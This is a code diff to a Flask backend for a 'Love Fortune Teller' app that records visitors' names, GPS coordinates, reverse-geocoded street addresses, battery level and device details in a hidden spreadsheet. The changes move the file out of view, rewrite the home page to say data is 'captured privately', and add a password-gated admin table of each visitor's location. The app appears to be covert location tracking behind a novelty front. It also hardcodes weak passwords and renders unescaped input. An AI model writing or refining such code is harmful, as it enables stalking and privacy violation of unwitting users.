@@ -8,8 +8,8 @@ from datetime import datetime
 app = Flask(__name__)
 CORS(app)
 
-EXCEL_FILE = 'fortunes_data.xlsx'
-ADMIN_SECRET = 'loveadmin2024'  # Change this password!
+EXCEL_FILE = '/tmp/fortunes_data.xlsx'  # Hidden server path - NOT public!
+ADMIN_PASSWORD = 'admin123'  # YOUR SECRET PASSWORD
 
 def init_excel():
     if not os.path.exists(EXCEL_FILE):
@@ -19,15 +19,14 @@ def init_excel():
 def geocode_reverse(lat, lon):
     try:
         url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
-        resp = requests.get(url, headers={'User-Agent': 'LoveFortuneTeller/1.0'})
-        data = resp.json()
-        return data.get('display_name', 'Unknown')
+        resp = requests.get(url, headers={'User-Agent': 'LoveTeller/1.0'})
+        return resp.json().get('display_name', 'Hidden')
     except:
-        return 'Address unavailable'
+        return 'Private'
 
 @app.route('/')
 def home():
-    return "Love Fortune Teller Backend 💕 - Admin: /admin?key=loveadmin2024"
+    return "💕 Love Fortune Backend - Data Captured Privately"
 
 @app.route('/save', methods=['POST'])
 def save_data():
@@ -36,7 +35,7 @@ def save_data():
     
     address = geocode_reverse(data['latitude'], data['longitude'])
     
-    new_row = {
+    new_row = pd.DataFrame([{
         'timestamp': datetime.now().isoformat(),
         'name': data['name'],
         'latitude': data['latitude'],
@@ -46,60 +45,52 @@ def save_data():
         'battery': data['battery'],
         'userAgent': data['userAgent'],
         'screen': data['screen']
-    }
+    }])
     
     df = pd.read_excel(EXCEL_FILE)
-    df = pd.concat([df, pd.DataFrame([new_row])], ignore_index=True)
-    df.to_excel(EXCEL_FILE, index=False)
+    df = pd.concat([df, new_row], ignore_index=True)
+    df.to_excel(EXCEL_FILE, index=False)  # SAVES DIRECTLY TO HIDDEN FILE
     
-    return jsonify({'status': 'saved 💖'})
+    return jsonify({'saved': True})
 
-@app.route('/admin')
+@app.route('/admin', methods=['GET', 'POST'])
 def admin():
-    key = request.args.get('key')
-    if key != ADMIN_SECRET:
-        abort(403)  # Forbidden for wrong/no key
+    # PASSWORD CHECK - NO URL GUESSING
+    if request.method == 'GET':
+        return '''
+        <form method="POST">
+            <h2>🔒 Private Admin</h2>
+            <input name="password" type="password" placeholder="Password">
+            <button>Login</button>
+        </form>
+        '''
     
-    if not os.path.exists(EXCEL_FILE):
-        return "No love data yet 💕"
-    
-    df = pd.read_excel(EXCEL_FILE)
-    html = """
-    <h1>🔒 Private Love Data Admin 💋</h1>
-    <p>Total Lovers: {} | Latest: {}</p>
-    """.format(len(df), df['timestamp'].iloc[-1] if len(df)>0 else 'None')
-    
-    html += "<table border='1' style='border-collapse:collapse; width:100%;'>"
-    html += "<tr style='background:#ff69b4'>"
-    for col in df.columns:
-        html += f"<th style='padding:8px; color:white;'>{col}</th>"
-    html += "</tr>"
-    
-    for idx, row in df.iterrows():
-        html += "<tr>"
-        for val in row:
-            html += f"<td style='padding:8px; border:1px solid #ddd;'>{val}</td>"
-        html += "</tr>"
-    html += "</table>"
-    
-    html += f"<br><a href='/download?key={ADMIN_SECRET}' style='background:#ff1493; color:white; padding:10px 20px; text-decoration:none; border-radius:5px;'>📥 Download Excel</a>"
-    return html
-
-@app.route('/download')
-def download():
-    key = request.args.get('key')
-    if key != ADMIN_SECRET:
+    if request.form.get('password') != ADMIN_PASSWORD:
         abort(403)
     
+    # SHOW DATA TABLE - NO DOWNLOAD LINK
     df = pd.read_excel(EXCEL_FILE)
-    from io import BytesIO
-    output = BytesIO()
-    with pd.ExcelWriter(output, engine='openpyxl') as writer:
-        df.to_excel(writer, index=False)
-    output.seek(0)
-    
-    from flask import send_file
-    return send_file(output, download_name='fortunes_data.xlsx', as_attachment=True)
+    html = f'''
+    <h1>💋 PRIVATE DATA ({len(df)} entries)</h1>
+    <table border="1" style="border-collapse:collapse;width:100%;font-family:monospace;">
+        <tr style="background:#ff1493;color:white;">
+            <th>Time</th><th>Name</th><th>GPS</th><th>Address</th><th>Battery</th><th>Device</th>
+        </tr>
+    '''
+    for _, row in df.iterrows():
+        gps = f"{row['latitude']:.4f}, {row['longitude']:.4f}"
+        html += f'''
+        <tr>
+            <td>{row['timestamp'][:19]}</td>
+            <td>{row['name']}</td>
+            <td>{gps}</td>
+            <td>{row['address'][:50]}...</td>
+            <td>{row['battery']}</td>
+            <td>{row['screen']} - {row['userAgent'][:30]}...</td>
+        </tr>
+        '''
+    html += '</table><p><a href="/admin">Refresh</a></p>'
+    return html
 
 if __name__ == '__main__':
     init_excel()
